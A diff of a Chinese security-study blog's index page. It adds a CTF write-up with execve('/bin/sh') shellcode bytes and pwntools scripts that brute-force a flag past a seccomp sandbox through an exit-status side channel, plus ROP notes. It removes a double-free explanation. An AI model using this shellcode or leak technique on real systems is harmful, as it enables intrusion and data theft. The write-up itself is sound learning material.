@@ -261,6 +261,652 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/07/22/seccomp-flag-s爆破/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/photo/hello.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/22/seccomp-flag-s爆破/" itemprop="url">seccomp_flag's爆破</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-22T14:01:15+08:00">
+                2019-07-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  0
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/07/22/seccompmp-flag-s爆破/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/photo/hello.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/22/seccompmp-flag-s爆破/" itemprop="url">seccompmp_flag' ![buf](seccomp-flag-s爆破\buf.PNG)</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-22T13:58:48+08:00">
+                2019-07-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  820
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  3
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>刚做完了一道题目，是一道shellcode题目，当然，有一定的保护 <img src="/2019/07/22/seccompmp-flag-s爆破/seccomp-flag-s爆破/buf.PNG" alt="buf"></p>
+<p> <img src="/2019/07/22/seccompmp-flag-s爆破/seccomp-flag-s爆破/protect.PNG" alt="protect"></p>
+<p>从以上两张照片可以看到这个题目中给的shellcode的限制</p>
+<p>不能出现空字符</p>
+<p>关闭了输入流，输出流，以及error</p>
+<p>只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）</p>
+<h4 id="任意输入数据，gdb调试一波"><a href="#任意输入数据，gdb调试一波" class="headerlink" title="任意输入数据，gdb调试一波"></a>任意输入数据，gdb调试一波</h4><p>加上，开始调试</p>
+<p> <img src="/2019/07/22/seccompmp-flag-s爆破/seccomp-flag-s爆破/bendiflag.PNG" alt="bendiflag"></p>
+<p>发现有有用的其实也就上面的图，读取/flag文件之后把内容读取到了rdi，rdx寄存器中。so，我们的shellcode 好写一点了。</p>
+<h4 id="长度限制"><a href="#长度限制" class="headerlink" title="长度限制"></a>长度限制</h4><p>长度&lt;=200</p>
+<p>我最常用的无任何限制的shellcode的长度是0x18</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05</span><br></pre></td></tr></table></figure>
+<p>即使是随便其他的shellcode，也比200小得多，所以这个限制没什么</p>
+<h4 id="关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）"><a href="#关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）" class="headerlink" title="关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）"></a>关闭了输入流，输出流，以及error。只允许使用read，write，exit，（还有一个我不知道是啥，好像是和信号处理有关）</h4><p>md，本来我是不知道close(0),close(1),close(2).所以我想的是既然开了write，还有rdi,rdx寄存器里存着，直接write读取不就完了。只要想着绕开空字符限制就好了。然而失败了。卡了好大阵子后。。终于发现read，close还是不能用。。。。我哭了</p>
+<h4 id="无空字符限制"><a href="#无空字符限制" class="headerlink" title="无空字符限制"></a>无空字符限制</h4><p>本来解决这个限制的原因是使用write系统调用，虽然write调用没用，但是解决方法倒是找到了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov rax,0x3c999999</span><br><span class="line">shr rax,24</span><br></pre></td></tr></table></figure>
+<p>使用这种方法，很轻松的就可以讲想要的寄存器放入任意的数值，而且，不需要担心空字节问题，我tql</p>
+<h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><p>最终，找到了方法，爆破，我只需要编写类似的语句就可以了</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if flag[i] == flag_byte:</span><br><span class="line">	i++</span><br><span class="line">else:</span><br><span class="line">	flag_byte++</span><br></pre></td></tr></table></figure>
+<p>emmm</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mov sil,byte ptr[rdx+&apos;&apos;&apos;+str(i)+&apos;&apos;&apos;]</span><br><span class="line">mov dil,&apos;&apos;&apos;+hex(flag_byte)+&apos;&apos;&apos;</span><br><span class="line">cmp sil,dil</span><br><span class="line">je right</span><br><span class="line">mov rax,0x11999999</span><br><span class="line">syscall</span><br><span class="line">right:</span><br><span class="line">mov rax,0x3c999999</span><br><span class="line">shr rax,24</span><br><span class="line">xor rdi,rdi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">xor rsi,rsi</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>只需要让他在失败的时候调用无法无法运行的语句，成功的时候正常退出就好了。完美</p>
+<h4 id="然而"><a href="#然而" class="headerlink" title="然而"></a>然而</h4><p>本地跑和远程居然不一样！</p>
+<p>我本地得到的反馈是，如果正常退出</p>
+<p>会有exit 0这样子的输出</p>
+<p>我就用pwntools里的p.poll来判断</p>
+<p>但是远程不行。。幸亏有反馈</p>
+<p>so，本地脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> flag_byte <span class="keyword">in</span> xrange(<span class="number">105</span>,<span class="number">107</span>): </span><br><span class="line">	p = process(<span class="string">'./pwn'</span>)</span><br><span class="line">	<span class="comment">#p = remote('pwn1.blue-whale.me',19910)</span></span><br><span class="line">	p.recvuntil(<span class="string">'vehicle\n'</span>)</span><br><span class="line">	<span class="comment">#the flag was stored in rdx and rdi</span></span><br><span class="line">	shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">	mov sil,byte ptr[rdx+'''</span>+str(i)+<span class="string">''']</span></span><br><span class="line"><span class="string">	mov dil,'''</span>+hex(flag_byte)+<span class="string">'''</span></span><br><span class="line"><span class="string">	cmp sil,dil</span></span><br><span class="line"><span class="string">	je right</span></span><br><span class="line"><span class="string">	mov rax,0x11999999</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	right:</span></span><br><span class="line"><span class="string">	mov rax,0x3c999999</span></span><br><span class="line"><span class="string">	shr rax,24</span></span><br><span class="line"><span class="string">	xor rdi,rdi</span></span><br><span class="line"><span class="string">	xor rdx,rdx</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	)</span><br><span class="line">	p.sendline(shellcode)</span><br><span class="line">	<span class="keyword">if</span> p.poll()!=<span class="number">0</span>:</span><br><span class="line">	    p.close()</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">	    flag += chr(flag_byte)</span><br><span class="line">	    log.success(flag)</span><br></pre></td></tr></table></figure>
+<p>远程脚本：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"><span class="comment">#flag = "ctf&#123;1eak1ng_0n1y_One_biT_is_impor7anT_To_The_security_of_2"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">for</span> flag_byte <span class="keyword">in</span> xrange(<span class="number">32</span>,<span class="number">127</span>): </span><br><span class="line">	<span class="comment">#p = process('./pwn')</span></span><br><span class="line">	p = remote(<span class="string">'pwn2.blue-whale.me'</span>,<span class="number">19910</span>)</span><br><span class="line">	p.recvuntil(<span class="string">'vehicle\n'</span>)</span><br><span class="line">	<span class="comment">#the flag was stored in rdx and rdi</span></span><br><span class="line">	shellcode = asm(<span class="string">'''</span></span><br><span class="line"><span class="string">	mov sil,byte ptr[rdx+'''</span>+str(i)+<span class="string">''']</span></span><br><span class="line"><span class="string">	mov dil,'''</span>+hex(flag_byte)+<span class="string">'''</span></span><br><span class="line"><span class="string">	cmp sil,dil</span></span><br><span class="line"><span class="string">	je right</span></span><br><span class="line"><span class="string">	mov rax,0x11999999</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	right:</span></span><br><span class="line"><span class="string">	mov rax,0x3c999999</span></span><br><span class="line"><span class="string">	shr rax,24</span></span><br><span class="line"><span class="string">	xor rdi,rdi</span></span><br><span class="line"><span class="string">	xor rdx,rdx</span></span><br><span class="line"><span class="string">	xor rsi,rsi</span></span><br><span class="line"><span class="string">	syscall</span></span><br><span class="line"><span class="string">	'''</span></span><br><span class="line">	)</span><br><span class="line">	p.sendline(shellcode)</span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		p.recv(timeout =<span class="number">0.5</span>)</span><br><span class="line">		p.close()</span><br><span class="line">	<span class="keyword">except</span>:</span><br><span class="line">		flag += chr(flag_byte)</span><br><span class="line">	    	log.success(flag)</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/07/17/rop书写的几种形式/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/photo/hello.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/17/rop书写的几种形式/" itemprop="url">rop书写的几种形式</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-17T12:15:45+08:00">
+                2019-07-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  100
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="1"><a href="#1" class="headerlink" title="1"></a>1</h4><p>64位的直接用p64</p>
+<p>32的直接写p32</p>
+<p>一个接一个，最基本的也是最常见的</p>
+<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p>先确定环境例如</p>
+<p>context.arch = ‘i386’</p>
+<p>一种类似layout = [payload]</p>
+<p>然后flat(layout)也就是省略了p32(payload)</p>
+<h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>第三种方法就是</p>
+<p>也是有一个rop = [payload]</p>
+<p>然后使用这种方式</p>
+<p>payload += ‘’.join(list(map(p64,rop)))</p>
+<p>效果一样</p>
+<p>主要还是看rop链本身的构造</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/07/07/计算机组成原理期末复习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/photo/hello.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/07/07/计算机组成原理期末复习/" itemprop="url">计算机组成原理期末复习</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-07T16:18:21+08:00">
+                2019-07-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  21
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="流水线"><a href="#流水线" class="headerlink" title="流水线"></a>流水线</h3><p><a href="https://www.cnblogs.com/wkfvawl/p/11004628.html" target="_blank" rel="noopener">https://www.cnblogs.com/wkfvawl/p/11004628.html</a></p>
+<h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p><a href="https://www.cnblogs.com/wkfvawl/p/10954376.html" target="_blank" rel="noopener">https://www.cnblogs.com/wkfvawl/p/10954376.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/07/01/密码学期末-whitegive/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1408,691 +2054,11 @@ void DFS(int v)//邻接矩阵的dfs
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/05/09/double-free的一次运用/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/photo/hello.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/05/09/double-free的一次运用/" itemprop="url">double free的以此运用</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-09T21:31:34+08:00">
-                2019-05-09
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  405
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  1
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>今天准备记录以下double free的一些运用。</p>
-<p>double free 顾名思义，是指一个指针连续free的两次，这是不正常的一种现象，那么这种不正常的原因是什么的？</p>
-<p>先看一个指针一次free之后会出现什么。</p>
-<p> <img src="/2019/05/09/double-free的一次运用/正常free.PNG" alt="正常free"></p>
-<p>也就是将free的这个地方给清零了。可是这种漏洞产生的原因在于，虽然这个地方清零了，但是指针还是存在的。也就是有漏洞的程序没有将保存指针的全局变量清零，或者数组清零。</p>
-<p>所以我们能够再次进行free这个地方了。so crazing </p>
-<p>再次free之后会出现什么</p>
-<p> <img src="/2019/05/09/double-free的一次运用/double free.PNG" alt="double free"></p>
-<p>出现了什么？居然出现了一个指针，而且恰好是这个堆的地址！</p>
-<p>why？</p>
-<p>其实原理就是和之前的fastbin的利用差不多，毕竟都是放在了一个链表中。只是这里的链表指向的是自身而已。我有时间会找一下源码~~放在这里</p>
-<p>所以说，下面的利用就是再申请一个同样大小的地址空间，so，我们就可以写入数据了，这时候我们只需要在这个地方写入一个地址，下次进行申请就会从这个地方进行申请了。</p>
-<p>就像fastbin中的利用一模一样~~只是那个是利用的堆溢出改写的fd而已，这里不需要栈溢出，因为下一个指向的地址我们已经可写，so</p>
-<p> <img src="/2019/05/09/double-free的一次运用/malloc13.PNG" alt="malloc13"></p>
-<p>再次申请 <img src="/2019/05/09/double-free的一次运用/mallloc2.PNG" alt="mallloc2"></p>
-<p>再次申请就是我们第一次写入的地址了</p>
-<p> <img src="/2019/05/09/double-free的一次运用/malloc3.PNG" alt="malloc3"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://ppcrab.github.io/2019/05/04/记一次迷宫问题引发的pythonC-交互分析/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="John Doe">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/photo/hello.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Hexo">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/05/04/记一次迷宫问题引发的pythonC-交互分析/" itemprop="url">记一次迷宫问题引发的pythonC++交互分析</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-04T23:33:49+08:00">
-                2019-05-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Words count in article&#58;</span>
-                
-                <span title="Words count in article">
-                  679
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Reading time &asymp;</span>
-                
-                <span title="Reading time">
-                  2
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>前两天突然想搞一道迷宫的misc，搞了半天，把迷宫的创建以及路径的找寻都弄完了。</p>
-<p>但是把题目挂在服务器之后，又出现了一点小问题。</p>
-<p>因为我用的是C++ 的vector容器，所以数据的存储删除都比较方便深度优先搜索。如果我选择继续使用python重构的话，似乎我还得重新弄个类出来。太麻烦了，不是说python是各种语言的粘合剂吗。我直接搞不就完了。</p>
-<p>所以开始我的第一次python与C++的交互之路。</p>
-<p>众所周知，python的底层语言是C，所以C++的符号表他是不认识的，这时候就得</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span>&#123;</span><br><span class="line">   </span><br><span class="line"> <span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">StructPointerTest</span>  </span></span><br><span class="line"><span class="class">   &#123;</span>  </span><br><span class="line">    <span class="keyword">char</span> dicr[<span class="number">30</span>];</span><br><span class="line">    <span class="keyword">int</span> realsize;  </span><br><span class="line">   </span><br><span class="line">   &#125;StructPointerTest, *StructPointer;</span><br><span class="line">   <span class="function"><span class="keyword">void</span> <span class="title">findway</span><span class="params">(<span class="keyword">int</span> ending_x,<span class="keyword">int</span> ending_y)</span></span>;</span><br><span class="line">   <span class="function"><span class="keyword">void</span> <span class="title">find_direct</span><span class="params">(<span class="keyword">int</span> x_p,<span class="keyword">int</span> y_p,<span class="keyword">int</span> ending_x,<span class="keyword">int</span> ending_y)</span></span>;</span><br><span class="line">   <span class="function">StructPointer <span class="title">seta</span><span class="params">(<span class="keyword">char</span> **ma)</span></span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>最主要的还是把函数给框进去，因为python 在交互的时调用的是这几个函数，所以一些用到的变量其实是不需要框进去的。</p>
-<p>喜闻乐见：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -o libpymazing.so -shared -fPIC ma.cpp</span><br></pre></td></tr></table></figure>
-<p>编译了libc库</p>
-<p>python端要做的是什么？</p>
-<p>需要用的一个核心的东西是</p>
